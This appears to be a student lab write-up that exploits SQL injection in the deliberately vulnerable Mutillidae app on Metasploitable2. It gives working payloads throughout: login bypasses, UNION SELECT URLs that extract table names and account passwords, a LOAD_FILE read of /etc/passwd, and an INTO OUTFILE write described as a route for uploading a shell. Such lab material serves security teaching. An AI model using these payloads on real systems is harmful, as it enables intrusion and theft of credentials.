# EX 8 SQL INJECTION
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![8 1](https://github.com/keerthanaa10/sqlinjection/assets/132996371/6e40f564-c21e-401b-95e3-41e76031a72c)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![8 2](https://github.com/keerthanaa10/sqlinjection/assets/132996371/75dff5c1-09c5-4f70-be67-87ee079241dc)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![8 3](https://github.com/keerthanaa10/sqlinjection/assets/132996371/d7d9cc2d-7012-4ad1-937f-d614b1088808)

Click on the menu Login/Register and register for an account


![8 4](https://github.com/keerthanaa10/sqlinjection/assets/132996371/4f572351-224d-4431-814c-2dc89b2380bd)


Click on the link “Please register here”
![8 5](https://github.com/keerthanaa10/sqlinjection/assets/132996371/b2c6e572-2d6e-40c7-8b83-a02706865b81)


Click on “Create Account” to display the following page:
![8 6](https://github.com/keerthanaa10/sqlinjection/assets/132996371/6ca24245-1769-450a-ada2-3df4ff2679ae)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.


![8 7](https://github.com/keerthanaa10/sqlinjection/assets/132996371/8ada98fb-bd76-48b9-9875-ef585169bb89)


Click “Login”. The logged in page will show as below:
![8 8](https://github.com/keerthanaa10/sqlinjection/assets/132996371/44f6218e-3bee-464a-9c2f-625f7a3db99e)




##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![8 9](https://github.com/keerthanaa10/sqlinjection/assets/132996371/3c026f87-6720-4dc0-aa69-89dfd923aa66)


Click the login button and you will see it enter into the administrator page.
![8 10](https://github.com/keerthanaa10/sqlinjection/assets/132996371/d37aa235-3cc0-4037-bf2d-4d4bf6bb666c)



## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![8 11](https://github.com/keerthanaa10/sqlinjection/assets/132996371/c734770b-1a5e-4bc9-ba6a-d50b030c0462)

![8 12](https://github.com/keerthanaa10/sqlinjection/assets/132996371/912cd82c-7fba-4139-bae8-529eb350d944)



![8 13](https://github.com/keerthanaa10/sqlinjection/assets/132996371/ab449144-1af5-4f20-8416-8a50fe7c5ec9)


![8 14](https://github.com/keerthanaa10/sqlinjection/assets/132996371/fa6853c6-72f8-46da-8dfb-68049de603bc)


![8 15](https://github.com/keerthanaa10/sqlinjection/assets/132996371/d5452b4f-b27c-4c42-88e2-3838cddbf669)


![8 16](https://github.com/keerthanaa10/sqlinjection/assets/132996371/0545cde3-e3e9-43e2-8187-ec3dcfeaf9e2)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![8 17](https://github.com/keerthanaa10/sqlinjection/assets/132996371/9a5204f7-fede-44dc-af67-4b09d8f1e644)



Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![8 18](https://github.com/keerthanaa10/sqlinjection/assets/132996371/5e6eaeef-30ae-4d93-8bf4-6b23dbe12fd6)


After adding the order by 6 into the existing url , the following error statement will be obtained:
![8 19](https://github.com/keerthanaa10/sqlinjection/assets/132996371/0010df54-1725-48ea-95b1-5f0de83497fb)




When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![8 20](https://github.com/keerthanaa10/sqlinjection/assets/132996371/797cc969-1731-4e43-a631-ddec2b99fb1d)



 As it is having 5 columns the query worked fine and it provides the correct result


![8 21](https://github.com/keerthanaa10/sqlinjection/assets/132996371/aef2d99b-dbd2-453c-b941-6dd3779a9fb2)



Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![8 22](https://github.com/keerthanaa10/sqlinjection/assets/132996371/a0c9bcde-2920-45c9-b5bc-83940e1faf46)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![8 23](https://github.com/keerthanaa10/sqlinjection/assets/132996371/5fd9e113-8964-41e0-90e0-f033447fdd9b)

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



![8 24](https://github.com/keerthanaa10/sqlinjection/assets/132996371/d898f70c-d73e-4122-9fee-aa1907068f96)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![8 25](https://github.com/keerthanaa10/sqlinjection/assets/132996371/797af364-a6f6-4bae-8b5b-51a27af86743)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




![8 26](https://github.com/keerthanaa10/sqlinjection/assets/132996371/adc607a4-0165-4ef1-bc5e-948ae15f546d)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![8 27](https://github.com/keerthanaa10/sqlinjection/assets/132996371/12a58694-e1bc-4b7e-970b-1fa7b17602dd)






Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![8 27](https://github.com/keerthanaa10/sqlinjection/assets/132996371/1a1c103e-11d0-49f3-a764-dd523e5e23ea)



## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![8 28](https://github.com/keerthanaa10/sqlinjection/assets/132996371/593c64cc-ff19-4484-834b-c4221b1cb918)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
